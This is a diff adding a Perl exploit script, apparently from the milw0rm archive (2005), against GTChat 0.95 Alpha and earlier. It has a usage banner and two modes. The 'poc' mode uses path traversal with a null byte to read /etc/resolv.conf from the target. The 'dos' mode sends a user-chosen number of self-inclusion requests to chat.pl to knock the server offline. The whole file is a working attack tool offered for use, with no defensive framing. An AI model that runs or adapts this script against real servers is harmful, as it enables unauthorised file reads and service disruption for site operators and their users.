@@ -1,0 +1,54 @@
+#!/usr/bin/perl  
+
+ use LWP::Simple;
+    
+ if (@ARGV < 3) 
+{ 
+    print "\nUsage: $0 [server] [path] [mode] [count for DoS]\n"; 
+    print "sever -  URL chat\n"; 
+    print "path  -  path to chat.pl\n"; 
+    print "mode  -  poc or dos,\n"; 
+    print "                    poc - simple check without DoS and exit,\n"; 
+    print "                    dos - DoS, you must set count for requests in 4 argument.\n\n";
+    exit (); 
+}   
+    $DoS      =     "dos";
+    $POC      =     "poc"; 
+    $server   =  $ARGV[0]; 
+    $path     =  $ARGV[1]; 
+    $mode     =  $ARGV[2]; 
+    $count    =  $ARGV[3];
+    print qq(
+                                           ###################################
+                                           # GTChat <= 0.95 Alpha remote DoS #
+                                           #   tested on GTChat 0.95 Alpha   #
+                                           # (c)oded by x97Rang 2005 RST/GHC #
+                                           #    Respect: b1f, 1dt.w0lf, ed   #
+                                           ################################### );
+ if ($mode eq $POC)
+{  
+    print "\n\nTry read file /etc/resolv.conf, maybe remote system unix...\n";
+    $URL = sprintf("http://%s%s/chat.pl?language=../../../../../../../../../../etc/resolv.conf%00 HTTP/1.0\nHost: %s\nAccept:*/*\nConnection:close\n\n",$server,$path,$server);  
+    $content = get "$URL";
+ if ($content =~ /(domain|sortlist|options|search|nameserver|dhclient)/) 
+{   print "File read successfully, remote system is *nix and $server are VULNERABLE!\n"; exit(); }
+ if ($content =~ /Fatal error/)
+{ 
+    print "File read failed, but *Fatal error* returned, $server MAYBE vulnerable, check all output:\n"; 
+    print "=== OUTPUT ===============================================================================\n"; 
+    print "\n$content\n"; 
+    print "=============================================================================== OUTPUT ===\n";
+    exit();
+}
+ else { print "Hmm.. if you arguments right, then $server NOT vulnerable, go sleep :)\n"; }
+}
+ if ($mode eq $DoS)
+{
+ if (!($count)) { print "\nNeed count for DoS requests, you don't set it, exit...\n"; exit() }
+    print "\nSend $count DoS requests to $server...\n";
+   $URL = sprintf("http://%s%schat.pl?language=chat.pl%00 HTTP/1.0\nHost: %s\nAccept:*/*\nConnection:close\n\n",$server,$path,$server);
+ for ($count_ov = 0; $count_ov != $count; $count_ov++) { $content = get "$URL"; }
+    print "Done, packets sended.\n";
+}
+
+# milw0rm.com [2005-08-18]
